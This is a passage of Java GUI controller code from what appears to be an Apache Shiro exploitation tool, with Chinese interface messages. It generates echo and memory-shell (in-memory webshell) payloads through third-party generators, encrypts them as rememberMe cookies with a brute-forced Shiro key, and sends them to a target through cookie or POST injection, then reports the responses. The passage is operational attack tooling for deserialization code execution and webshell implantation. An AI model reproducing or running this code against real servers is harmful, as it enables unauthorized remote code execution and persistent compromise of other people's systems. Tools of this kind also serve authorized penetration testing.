            this.echoGeneratorOutput.appendText("[提示] 当前未填写 Shiro Key，jEG 将仅尝试输出第三方原始 payload；若需回退传统模式或生成最终 rememberMe，请先提供 Base64 key。\n");
        }
        EchoGenerateResult result;
        try {
            String jegCmd = this.jegCmdInput != null ? this.jegCmdInput.getText() : "";
            String jegCode = this.jegCodeInput != null ? this.jegCodeInput.getText() : "";
            result = this.attackService.generateEchoWithThirdParty(
                    source,
                    this.jegServerOpt.getValue(),
                    this.jegModelOpt.getValue(),
                    this.jegFormatOpt.getValue(),
                    this.gadgetOpt.getValue(),
                    this.echoOpt.getValue(),
                    key,
                    jegCmd,
                    jegCode
            );
        } catch (Exception ex) {
            this.echoGeneratorOutput.appendText("[Echo] exception: " + ex.getMessage() + "\n");
            this.echoGeneratorOutput.appendText("-------------------------------------------------\n");
            this.showGuidanceAlert(
                    AlertType.ERROR,
                    "Echo 生成异常",
                    ex.getClass().getSimpleName(),
                    "未预期异常：" + ex.getMessage() + "\n\n"
                            + "请检查：目标 URL、网络与代理、JDK 是否为 8；仍失败请携带本段日志反馈。\n");
            return;
        }
        this.echoGeneratorOutput.appendText("[" + this.displaySourceName(result.getSource()) + "] " + (result.isSuccess() ? "success" : "failed") + "\n");
        if (result.getServerType() != null || result.getModelType() != null || result.getFormatType() != null) {
            this.echoGeneratorOutput.appendText("selection: server=" + String.valueOf(result.getServerType())
                    + ", model=" + String.valueOf(result.getModelType())
                    + ", format=" + String.valueOf(result.getFormatType()) + "\n");
        }
        if (result.getRequestHeaderName() != null && !result.getRequestHeaderName().isEmpty()) {
            this.echoGeneratorOutput.appendText("header: " + result.getRequestHeaderName() + "\n");
        }
        if (result.getPayload() != null) {
            this.echoGeneratorOutput.appendText(result.getPayload() + "\n");
        }
        if (result.getMessage() != null) {
            this.echoGeneratorOutput.appendText("message: " + result.getMessage() + "\n");
        }
        this.echoGeneratorOutput.appendText("-------------------------------------------------\n");
        if (result.isSuccess() && result.getPayload() != null && !result.getPayload().trim().isEmpty()) {
            this.lastEchoExploitPayload = result.getPayload().trim();
            this.lastEchoExploitSource = result.getSource();
            this.lastEchoExploitRequestHeaderName = result.getRequestHeaderName();
            this.lastEchoExploitGadget = this.gadgetOpt != null ? this.gadgetOpt.getValue() : null;
            this.lastEchoExploitEcho = this.echoOpt != null ? this.echoOpt.getValue() : null;
            this.syncAttackServiceForEchoExploit(this.lastEchoExploitPayload, this.lastEchoExploitRequestHeaderName, this.lastEchoExploitGadget);
            this.echoGeneratorOutput.appendText("[缓存] 已记录回显载荷上下文，gadget=" + String.valueOf(this.lastEchoExploitGadget)
                    + ", echo=" + String.valueOf(this.lastEchoExploitEcho) + "\n");
            if (AttackService.attackRememberMe != null && AttackService.looksLikeRememberMeCookiePayload(AttackService.attackRememberMe)) {
                this.echoGeneratorOutput.appendText("[缓存] 已同步到命令执行/功能区（rememberMe Cookie，含 jEG 纯密文自动补前缀）\n");
            }
        }
        if (!result.isSuccess()) {
            this.showGuidanceAlert(
                    AlertType.WARNING,
                    "Echo 生成失败",
                    "来源：" + this.displaySourceName(result.getSource()),
                    this.buildEchoFailureGuidance(result));
        }
    }

    @FXML
    void sendEchoShiroExploitBtn(ActionEvent actionEvent) {
        if (this.attackService == null) {
            this.initAttack();
        }
        if (this.lastEchoExploitPayload == null || this.lastEchoExploitPayload.trim().isEmpty()) {
            this.echoGeneratorOutput.appendText("[!] 请先在上方点击「生成/回退生成」并得到成功结果。\n");
            this.showGuidanceAlert(
                    AlertType.INFORMATION,
                    "无可用载荷",
                    "尚未缓存回显生成结果",
                    "请先在「回显生成」中成功生成载荷后，再点「Shiro 利用」。");
            return;
        }
        if (AttackService.gadget == null) {
            this.logTextArea.appendText(Utils.log("请先获取密钥和构造链"));
            this.showGuidanceAlert(
                    AlertType.INFORMATION,
                    "无法发送",
                    "尚未完成「密钥 + 利用链」检测",
                    "与「内存马注入」相同：需先检测密钥并检测/爆破利用链成功后，再使用 Shiro 利用。");
            return;
        }
        String key = this.shiroKey != null ? this.shiroKey.getText() : "";
        if (key == null || key.trim().isEmpty()) {
            key = AttackService.realShiroKey;
        }
        if (key == null || key.trim().isEmpty()) {
            this.showGuidanceAlert(
                    AlertType.WARNING,
                    "缺少 Key",
                    "无法加密 rememberMe",
                    "请在「指定Key」填写 Base64 key，或先爆破密钥成功。");
            return;
        }
        String coerced = AttackService.coerceRememberMeCookieHeader(this.lastEchoExploitPayload, this.lastEchoExploitRequestHeaderName);
        boolean fromJeg = this.lastEchoExploitSource != null && "jEG".equalsIgnoreCase(this.lastEchoExploitSource.trim());
        String payloadKind = fromJeg && coerced != null ? "jEG-as-rememberMe-cookie"
                : (AttackService.looksLikeRememberMeCookiePayload(this.lastEchoExploitPayload) ? "cookie" : "body");
        AppLogger.info("回显 Shiro 利用: gadget=" + AttackService.gadget + ", payloadKind=" + payloadKind);
        this.echoGeneratorOutput.appendText("[发送] 开始使用 Shiro 链发送回显载荷\n");
        this.echoGeneratorOutput.appendText("[发送] 当前检测到的构造链=" + String.valueOf(AttackService.gadget)
                + ", 当前缓存载荷链=" + String.valueOf(this.lastEchoExploitGadget)
                + ", 当前缓存回显=" + String.valueOf(this.lastEchoExploitEcho) + "\n");
        if (AttackService.gadget != null && this.lastEchoExploitGadget != null
                && !AttackService.gadget.equals(this.lastEchoExploitGadget)) {
            this.echoGeneratorOutput.appendText("[警告] 当前检测链与缓存载荷链不一致；发送时将优先使用当前检测链。\n");
        }
        if (fromJeg && coerced != null) {
            this.echoGeneratorOutput.appendText("[发送] jEG：与内置回显相同方式发送（GET，Cookie=rememberMe；命令执行仍通过 Authorization）\n");
            this.lastEchoExploitPayload = coerced;
            this.syncAttackServiceForEchoExploit(coerced, null, AttackService.gadget);
            String result = this.attackService.sendRememberMeCookieExploit(coerced, this.echoGeneratorOutput);
            if (result != null) {
                this.echoGeneratorOutput.appendText("[发送结果] HTTP 已返回，长度=" + result.length() + "\n");
                this.echoGeneratorOutput.appendText("[发送结果] " + this.attackService.classifyHttpResponse(result) + "\n");
            } else {
                this.echoGeneratorOutput.appendText("[发送结果] 未收到有效响应\n");
            }
        } else if (AttackService.looksLikeRememberMeCookiePayload(this.lastEchoExploitPayload)) {
            String selectedEcho = this.echoOpt != null ? this.echoOpt.getValue() : null;
            String rememberMe = this.attackService.GadgetPayload(AttackService.gadget, selectedEcho, key.trim());
            if (rememberMe == null || rememberMe.trim().isEmpty()) {
                this.echoGeneratorOutput.appendText("[发送结果] 无法根据当前构造链重新生成 rememberMe\n");
                this.echoGeneratorOutput.appendText("-------------------------------------------------\n");
                return;
            }
            this.lastEchoExploitPayload = rememberMe.trim();
            this.lastEchoExploitGadget = AttackService.gadget;
            this.lastEchoExploitEcho = selectedEcho;
            this.syncAttackServiceForEchoExploit(this.lastEchoExploitPayload, null, AttackService.gadget);
            this.echoGeneratorOutput.appendText("[发送] 已按当前构造链重新生成 rememberMe，gadget=" + AttackService.gadget
                    + ", echo=" + String.valueOf(selectedEcho) + "\n");
            String result = this.attackService.sendRememberMeCookieExploit(this.lastEchoExploitPayload, this.echoGeneratorOutput);
            if (result != null) {
                this.echoGeneratorOutput.appendText("[发送结果] HTTP 已返回，长度=" + result.length() + "\n");
                this.echoGeneratorOutput.appendText("[发送结果] " + this.attackService.classifyHttpResponse(result) + "\n");
            } else {
                this.echoGeneratorOutput.appendText("[发送结果] 未收到有效响应\n");
            }
        } else {
            this.echoGeneratorOutput.appendText("[发送] 当前缓存非 rememberMe Cookie 载荷，按内存马注入通道发送（POST user=…）\n");
            this.echoGeneratorOutput.appendText("[发送] gadget=" + String.valueOf(this.lastEchoExploitGadget)
                    + ", echo=" + String.valueOf(this.lastEchoExploitEcho) + "\n");
            String result = this.attackService.sendInjectMemToolExploit(AttackService.gadget, key.trim(), this.lastEchoExploitPayload, this.echoGeneratorOutput);
            if (result != null) {
                this.echoGeneratorOutput.appendText("[发送结果] HTTP 已返回，长度=" + result.length() + "\n");
                this.echoGeneratorOutput.appendText("[发送结果] " + this.attackService.classifyHttpResponse(result) + "\n");
            } else {
                this.echoGeneratorOutput.appendText("[发送结果] 未收到有效响应\n");
            }
        }
        this.echoGeneratorOutput.appendText("-------------------------------------------------\n");
    }

    @FXML
    void genMemshellBtn(ActionEvent actionEvent) {
        if (this.attackService == null) {
            this.initAttack();
        }
        String selectedSource = this.memshellSourceOpt.getValue();
        AppLogger.info("内存马生成: source=" + selectedSource + ", server=" + this.jmgServerOpt.getValue() + ", tool=" + this.jmgToolOpt.getValue() + ", shell=" + this.jmgShellOpt.getValue() + ", format=" + this.jmgFormatOpt.getValue() + ", gadget=" + this.jmgGadgetOpt.getValue());
        if (selectedSource == null || selectedSource.trim().isEmpty()) {
            selectedSource = "传统模式";
            this.memshellSourceOpt.setValue("传统模式");
        }
        String source = this.normalizeMemshellSource(selectedSource);
        String selectedServer = this.jmgServerOpt.getValue();
        String selectedShell = this.jmgShellOpt.getValue();
        String jmgWarning = this.buildJmgSelectionWarning(selectedServer, selectedShell);
        if (jmgWarning != null && "jMG".equalsIgnoreCase(source)) {
            this.memshellGeneratorOutput.appendText("[提示] " + jmgWarning.replace("\n", " ") + "\n");
        }
        MemshellGenerateResult result;
        try {
            result = this.attackService.generateMemshellWithThirdParty(
                    source,
                    this.jmgToolOpt.getValue(),
                    selectedServer,
                    selectedShell,
                    this.jmgFormatOpt.getValue(),
                    this.jmgGadgetOpt.getValue(),
                    this.memShellOpt.getValue()
            );
        } catch (Exception ex) {
            this.memshellGeneratorOutput.appendText("[Memshell] exception: " + ex.getMessage() + "\n");
            this.memshellGeneratorOutput.appendText("-------------------------------------------------\n");
            this.showGuidanceAlert(
                    AlertType.ERROR,
                    "内存马载荷生成异常",
                    ex.getClass().getSimpleName(),
                    "未预期异常：" + ex.getMessage() + "\n\n"
                            + "建议：来源改为 Legacy；确认 jmg-sdk 已安装；使用 JDK 8 运行。\n");
            return;
        }
        String resultTitle = this.displaySourceName(selectedSource);
        if (result.getFallbackSource() != null && !result.getFallbackSource().trim().isEmpty()) {
            resultTitle = this.displaySourceName(result.getFallbackSource()) + " -> " + this.displaySourceName(result.getSource());
        }
        this.memshellGeneratorOutput.appendText("[" + resultTitle + "] " + (result.isSuccess() ? "success" : "failed") + "\n");
        if (result.getPayload() != null) {
            this.memshellGeneratorOutput.appendText(result.getPayload() + "\n");
        }
        if (result.getBasicInfo() != null && !result.getBasicInfo().isEmpty()) {
            this.memshellGeneratorOutput.appendText(result.getBasicInfo() + "\n");
        }
        if (result.getDebugInfo() != null && !result.getDebugInfo().isEmpty()) {
            this.memshellGeneratorOutput.appendText(result.getDebugInfo() + "\n");
        }
        if (result.getMessage() != null) {
            this.memshellGeneratorOutput.appendText("message: " + result.getMessage() + "\n");
        }
        if (result.getToolType() != null || result.getServerType() != null || result.getShellType() != null || result.getFormatType() != null || result.getGadgetType() != null) {
            this.memshellGeneratorOutput.appendText("selection: server=" + String.valueOf(result.getServerType())
                    + ", tool=" + String.valueOf(result.getToolType())
                    + ", shell=" + String.valueOf(result.getShellType())
                    + ", format=" + String.valueOf(result.getFormatType())
                    + ", gadget=" + String.valueOf(result.getGadgetType()) + "\n");
        }
        if (result.getFallbackSource() != null && !result.getFallbackSource().trim().isEmpty()) {
            this.memshellGeneratorOutput.appendText("third-party source: " + this.displaySourceName(result.getFallbackSource()) + "\n");
            if (result.getFallbackMessage() != null && !result.getFallbackMessage().trim().isEmpty()) {
                this.memshellGeneratorOutput.appendText("third-party error: " + result.getFallbackMessage() + "\n");
            }
            this.memshellGeneratorOutput.appendText("fallback: 已自动回退到" + this.displaySourceName(result.getSource()) + "并生成成功\n");
        }
        this.memshellGeneratorOutput.appendText("-------------------------------------------------\n");
        if (!result.isSuccess()) {
            this.showGuidanceAlert(
                    AlertType.WARNING,
                    "内存马载荷生成失败",
                    "来源：" + this.displaySourceName(result.getSource()),
                    this.buildMemshellFailureGuidance(result));
            return;
        }
        if (result.getPayload() != null && !result.getPayload().trim().isEmpty()) {
            this.lastMemshellExploitPayload = result.getPayload().trim();
            this.lastMemshellExploitSource = result.getSource();
        }
    }

    @FXML
    void sendMemshellShiroInjectBtn(ActionEvent actionEvent) {
        if (this.attackService == null) {
            this.initAttack();
        }
        if (this.lastMemshellExploitPayload == null || this.lastMemshellExploitPayload.trim().isEmpty()) {
            this.memshellGeneratorOutput.appendText("[!] 请先生成内存马载荷。\n");
            this.showGuidanceAlert(
                    AlertType.INFORMATION,
                    "无可用载荷",
                    "尚未缓存生成结果",
                    "请先在「内存马生成」中成功生成后，再点「Shiro 注入」。");
            return;
        }
        if (AttackService.gadget == null) {
            this.logTextArea.appendText(Utils.log("请先获取密钥和构造链"));
            this.showGuidanceAlert(
                    AlertType.INFORMATION,
                    "无法注入",
                    "尚未完成「密钥 + 利用链」检测",
                    "请先完成密钥与利用链检测（与「内存马注入」页相同前置条件）。");
            return;
        }
        String key = this.shiroKey != null ? this.shiroKey.getText() : "";
        if (key == null || key.trim().isEmpty()) {
            key = AttackService.realShiroKey;
        }
        if (key == null || key.trim().isEmpty()) {
            this.showGuidanceAlert(
                    AlertType.WARNING,
                    "缺少 Key",
                    "无法加密 rememberMe",
                    "请在「指定Key」填写 Base64 key，或先爆破密钥成功。");
            return;
        }
        this.memshellGeneratorOutput.appendText("[发送] 与「内存马注入」相同流程：InjectMemTool rememberMe Cookie + POST user=生成载荷 Base64\n");
        String pass = this.shellPassText != null ? this.shellPassText.getText() : "";
        String path = this.shellPathText != null ? this.shellPathText.getText() : "";
        String memLabel;
        if (this.lastMemshellExploitSource != null && "jMG".equalsIgnoreCase(this.lastMemshellExploitSource.trim())) {
            memLabel = "jMG " + String.valueOf(this.jmgToolOpt != null ? this.jmgToolOpt.getValue() : "")
                    + "/" + String.valueOf(this.jmgShellOpt != null ? this.jmgShellOpt.getValue() : "");
        } else {
            memLabel = this.memShellOpt != null ? this.memShellOpt.getValue() : "传统模式内存马";
        }
        AppLogger.info("内存马 Shiro 注入: gadget=" + AttackService.gadget + ", path=" + path + ", label=" + memLabel);
        String result = this.attackService.sendInjectMemToolExploit(
                AttackService.gadget,
                key.trim(),
                this.lastMemshellExploitPayload,
                pass != null ? pass : "",
                path != null ? path : "",
                this.memshellGeneratorOutput,
                memLabel);
        if (result != null) {
            this.memshellGeneratorOutput.appendText("[发送结果] 已收到响应，长度=" + result.length() + "\n");
        } else {
            this.memshellGeneratorOutput.appendText("[发送结果] 未收到有效响应\n");
        }
    }
}
